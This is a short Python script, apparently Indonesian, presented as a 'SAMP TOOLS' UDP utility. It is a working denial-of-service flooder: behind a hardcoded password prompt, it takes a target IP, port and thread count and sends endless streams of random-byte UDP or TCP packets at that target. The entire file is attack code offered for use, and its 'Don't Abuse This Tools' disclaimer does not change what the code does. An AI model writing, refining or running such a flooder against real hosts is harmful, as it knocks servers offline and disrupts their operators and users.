import random
import socket
import threading
import time
import os
import sys
from time import sleep

os.system("clear")
password ="LevrinceGantenk"

for i in range(3):
    pwd = input("[ ! ] PASSWORD: ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("[] TUNGGU 5 DETIK!!! ")
        break
    else:
        time.sleep(5)
        print("[×] PASSWORD SALAH!!! ")
        continue
time.sleep(5)
print("{} Selesai Menggunakan Password")
print("{•} Don't Abuse This Tools")

print("""
█░░ █▀ █░█ ░██░ ▄▀▀▄
█░░ █▀ █░█ █▄█▄ ▄▀▀▄
▀▀▀ ▀▀ ░▀░ ░░█░ ▀▄▄▀
| SAMP TOOLS || UDP |""")


ip = str(input(" Ip target  : "))
port = int(input(" Port Target : "))
choice = str(input(" Methods : "))
times = int(input(" Paket : "))
threads = int(input(" Threads : "))

def udp():
  data = random._urandom(1180)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(f"LEVRINCE MENYERANG {ip} port {port}")
    except:
      print(f"LEVRINCE MENYERANG {ip} port {port}")

def tcp():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"LEVRINCE MENYERANG {ip} port {port}")
    except:
     s.close()
     print(f"LEVRINCE MENYERANG {ip} port {port}")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()